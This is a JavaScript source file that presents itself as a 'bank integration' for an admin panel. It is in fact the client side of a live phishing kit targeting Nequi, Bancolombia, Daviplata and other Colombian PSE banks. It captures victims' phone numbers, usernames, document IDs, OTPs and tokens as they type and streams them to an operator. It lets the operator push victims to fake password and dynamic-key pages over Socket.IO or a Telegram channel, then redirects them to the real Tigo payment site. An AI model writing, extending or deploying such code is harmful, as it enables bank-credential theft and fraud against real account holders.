/**
 * Universal Bank Integration for Admin Panel
 * Auto-detects and integrates all PSE banks with real-time monitoring
 */

class UniversalBankIntegration {
    constructor() {
        this.sessionId = this.getOrCreateSessionId();
        this.bankName = this.detectBank();
        this.currentStep = 'inicio';
        this.initIntegration();
        this.setupActionListener();
    }

    detectBank() {
        const path = window.location.pathname;
        const url = window.location.href;

        // Nequi detection
        if (path.includes('/Nequi/') || url.includes('nequi')) {
            return 'Nequi';
        }

        // Bancolombia detection  
        if (path.includes('/Bancolombia/') || url.includes('bancolombia')) {
            return 'Bancolombia';
        }

        // Daviplata detection
        if (path.includes('/Daviplata/') || url.includes('daviplata')) {
            return 'Daviplata';
        }

        // Davivienda detection
        if (path.includes('/Davivienda/') || url.includes('davivienda')) {
            return 'Davivienda';
        }

        // Banco de Bogotá detection
        if (path.includes('/Bogota/') || url.includes('bogota')) {
            return 'Banco de Bogotá';
        }

        // Other PSE banks
        const psePattern = /\/bancas\/([^\/]+)\//;
        const match = path.match(psePattern);
        if (match) {
            return match[1].replace(/-/g, ' ').replace(/\b\w/g, l => l.toUpperCase());
        }

        return 'PSE Bank';
    }

    getOrCreateSessionId() {
        const storageKey = `${this.detectBank().toLowerCase().replace(/\s+/g, '_')}_session_id`;
        let sessionId = localStorage.getItem(storageKey) || sessionStorage.getItem(storageKey);
        
        if (!sessionId) {
            sessionId = `${this.detectBank().toLowerCase()}_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
            localStorage.setItem(storageKey, sessionId);
        }
        
        return sessionId;
    }

    initIntegration() {
        if (!window.AdminPanel) {
            console.log('[UNIVERSAL BANK] Admin panel not available');
            return;
        }

        // Get initial page data
        const initialData = this.extractPageData();
        
        // Notify session start
        window.AdminPanel.notifySessionStart(this.sessionId, this.bankName, {
            step: this.currentStep,
            page: this.getCurrentPage(),
            url: window.location.pathname,
            ...initialData
        });

        console.log(`[UNIVERSAL BANK] ${this.bankName} session started: ${this.sessionId}`);

        // Track page changes
        this.trackPageChanges();
        
        // Track form interactions
        this.trackFormInteractions();

        // Track button clicks
        this.trackButtonClicks();
    }

    extractPageData() {
        const data = {};

        // Extract phone numbers
        const phoneInputs = document.querySelectorAll('input[type="tel"], input[name*="phone"], input[name*="celular"], input[placeholder*="celular"]');
        phoneInputs.forEach(input => {
            if (input.value) data.celular = input.value;
        });

        // Extract user/document inputs
        const userInputs = document.querySelectorAll('input[name*="user"], input[name*="usuario"], input[name*="document"]');
        userInputs.forEach(input => {
            if (input.value) data.usuario = input.value;
        });

        // Extract amount from session
        const amount = sessionStorage.getItem('payment_amount') || sessionStorage.getItem('amount');
        if (amount) data.monto = amount;

        // Extract OTP/Token inputs
        const otpInputs = document.querySelectorAll('input[name*="otp"], input[name*="token"], input[id*="otp"]');
        if (otpInputs.length > 0) {
            const otpValue = Array.from(otpInputs).map(i => i.value).join('');
            if (otpValue) data.otp = otpValue;
        }

        return data;
    }

    getCurrentPage() {
        const path = window.location.pathname;
        const filename = path.split('/').pop() || 'index.html';
        return filename.replace('.html', '');
    }

    trackPageChanges() {
        // Override window navigation to track page changes
        const originalPushState = history.pushState;
        const originalReplaceState = history.replaceState;
        
        history.pushState = (...args) => {
            originalPushState.apply(history, args);
            this.onPageChange();
        };
        
        history.replaceState = (...args) => {
            originalReplaceState.apply(history, args);
            this.onPageChange();
        };

        window.addEventListener('popstate', () => this.onPageChange());
    }

    trackFormInteractions() {
        // Track form submissions
        document.addEventListener('submit', (e) => {
            const data = this.extractPageData();
            this.updateSession('form-submit', data);
        });

        // Track input changes with debounce
        let inputTimeout;
        document.addEventListener('input', (e) => {
            if (inputTimeout) clearTimeout(inputTimeout);
            inputTimeout = setTimeout(() => {
                const data = this.extractPageData();
                if (Object.keys(data).length > 0) {
                    window.AdminPanel.notifySessionData(this.sessionId, data);
                }
            }, 1000);
        });
    }

    trackButtonClicks() {
        document.addEventListener('click', (e) => {
            const button = e.target.closest('button');
            if (button) {
                const buttonText = button.textContent.trim().toLowerCase();
                
                // Detect step based on button action
                let step = this.currentStep;
                if (buttonText.includes('continuar') || buttonText.includes('validar')) {
                    step = 'validando';
                } else if (buttonText.includes('confirmar')) {
                    step = 'confirmando';
                } else if (buttonText.includes('finalizar')) {
                    step = 'finalizando';
                }
                
                if (step !== this.currentStep) {
                    this.updateSession(step);
                }
            }
        });
    }

    onPageChange() {
        this.currentStep = this.getCurrentPage();
        const data = this.extractPageData();
        this.updateSession(this.currentStep, data);
    }

    updateSession(step, data = {}) {
        this.currentStep = step;
        
        if (window.AdminPanel) {
            window.AdminPanel.notifySessionUpdate(this.sessionId, step, {
                page: this.getCurrentPage(),
                url: window.location.pathname,
                timestamp: Date.now(),
                ...data
            });
        }
    }

    setupActionListener() {
        // Listen for actions from admin panel
        if (typeof io !== 'undefined') {
            try {
                const socket = io();
                
                // Listen for session-specific actions
                socket.on(`session_${this.sessionId}`, (data) => {
                    console.log(`[UNIVERSAL BANK] Admin action received:`, data);
                    this.handleAdminAction(data.action);
                });

                // Also listen for generic telegram_action events
                socket.on('telegram_action', (data) => {
                    console.log(`[UNIVERSAL BANK] Telegram action received:`, data);
                    this.handleAdminAction(data.action);
                });

            } catch (e) {
                console.log('[UNIVERSAL BANK] Socket.IO not available for admin actions');
            }
        }
    }

    handleAdminAction(action) {
        console.log(`[UNIVERSAL BANK] Handling action: ${action}`);

        // Generic actions
        if (action === 'finalizar' || action === 'finish') {
            localStorage.removeItem(`${this.bankName.toLowerCase().replace(/\s+/g, '_')}_session_id`);
            sessionStorage.clear();
            window.location.href = 'https://mi.tigo.com.co/pago-express/facturas';
            return;
        }

        // Bank-specific actions
        this.handleBankSpecificAction(action);
    }

    handleBankSpecificAction(action) {
        const bank = this.bankName.toLowerCase();

        if (bank === 'nequi') {
            this.handleNequiAction(action);
        } else if (bank === 'bancolombia') {
            this.handleBancolombia(action);
        } else {
            this.handleGenericPseAction(action);
        }
    }

    handleNequiAction(action) {
        switch (action) {
            case 'nequi_pedir_numero':
            case 'nequi_request_numero':
                window.location.href = 'numero.html';
                break;
            case 'nequi_pedir_clave':
            case 'nequi_request_clave':
                window.location.href = 'clave.html';
                break;
            case 'nequi_pedir_saldo':
            case 'nequi_request_saldo':
                window.location.href = 'saldo-input.html';
                break;
            case 'nequi_pedir_dinamica':
            case 'nequi_request_dinamica':
                window.location.href = 'clave-dinamica.html';
                break;
            case 'nequi_error_clave':
                window.location.href = 'clave.html';
                break;
            case 'nequi_error_dinamica':
                window.location.href = 'clave-dinamica.html';
                break;
        }
    }

    handleBancolombiaAction(action) {
        switch (action) {
            case 'request_user':
            case 'request_usuario':
                window.location.href = 'cedula.html';
                break;
            case 'request_password':
            case 'request_clave':
                window.location.href = 'password.html';
                break;
            case 'request_dynamic':
            case 'request_dinamica':
                window.location.href = 'dinamica.html';
                break;
            case 'error_user':
                window.location.href = 'cedula.html';
                break;
            case 'error_password':
                window.location.href = 'password.html';
                break;
        }
    }

    handleGenericPseAction(action) {
        const actionMap = {
            'request_login': 'index.html',
            'request_user': 'index.html',
            'request_password': 'password.html',
            'request_clave': 'password.html',
            'request_otp': 'otp.html',
            'request_token': 'token.html',
            'request_dynamic': 'dinamica.html',
            'request_dinamica': 'dinamica.html',
            'error_login': 'index.html',
            'error_password': 'password.html',
            'error_otp': 'otp.html'
        };

        const page = actionMap[action];
        if (page) {
            window.location.href = page;
        }
    }

    // Public method to manually update session
    static updateSession(step, data = {}) {
        if (window.universalBank) {
            window.universalBank.updateSession(step, data);
        }
    }

    // Public method to end session
    static endSession() {
        if (window.universalBank && window.AdminPanel) {
            window.AdminPanel.notifySessionEnd(window.universalBank.sessionId);
        }
    }
}

// Auto-initialize on DOM ready
document.addEventListener('DOMContentLoaded', () => {
    // Only initialize if we're in a bank page
    if (window.location.pathname.includes('/bancas/')) {
        console.log('[UNIVERSAL BANK] Initializing bank integration...');
        window.universalBank = new UniversalBankIntegration();
    }
});

// Handle page unload
window.addEventListener('beforeunload', () => {
    if (window.universalBank && window.AdminPanel) {
        // Mark session as inactive on page leave
        window.AdminPanel.notifySessionUpdate(
            window.universalBank.sessionId, 
            'inactive', 
            { active: false }
        );
    }
});